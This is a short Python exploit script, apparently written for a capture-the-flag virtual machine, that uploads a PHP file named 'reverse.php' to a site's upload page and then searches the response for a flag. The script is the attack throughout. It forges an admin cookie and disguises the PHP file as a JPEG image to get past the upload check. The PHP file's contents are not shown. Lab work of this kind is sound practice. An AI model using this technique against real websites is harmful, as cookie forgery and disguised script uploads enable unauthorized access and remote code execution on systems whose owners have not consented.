import os
import re
import requests
from pathlib import Path

VM_IP = os.environ.get("VM_IP")
if not VM_IP:
    raise SystemExit("Error: VM_IP environment variable is not set. Usage: VM_IP=<ip> python exploit.py")
url = f"http://{VM_IP}/?page=upload"

cookies = {"I_am_admin": "68934a3e9455fa72420237eb05902327"}

php_file = Path(__file__).parent / "reverse.php"
with open(php_file, "rb") as f:
    file_data = f.read()

files = {
    "MAX_FILE_SIZE": (None, "100000"),
    "uploaded": ("reverse.php", file_data, "image/jpeg"),
    "Upload": (None, "Upload"),
}

r = requests.post(url, files=files, cookies=cookies)
match = re.search(r"flag is : ([a-f0-9]{64})", r.text, re.IGNORECASE)
if match:
    print(f"Flag: {match.group(1)}")
else:
    print("Flag not found in response")
